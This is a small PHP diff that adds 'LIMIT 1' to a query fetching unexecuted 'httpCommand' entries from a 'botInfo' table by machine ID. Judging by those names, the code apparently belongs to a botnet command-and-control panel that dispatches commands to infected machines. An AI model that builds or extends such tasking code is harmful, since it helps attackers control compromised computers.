@@ -28,7 +28,7 @@
 		}
 		if ($callingFunction == 'do') {
 			$stmt = $mysqli->stmt_init();
-			$sqlFunc="SELECT httpCommand FROM botInfo WHERE machineID=? AND executed='N'";
+			$sqlFunc="SELECT httpCommand FROM botInfo WHERE machineID=? AND executed='N' LIMIT 1";
 			if ($stmt->prepare($sqlFunc)) {
 				$stmt->bind_param("s", $machineID);
 				$stmt->execute();
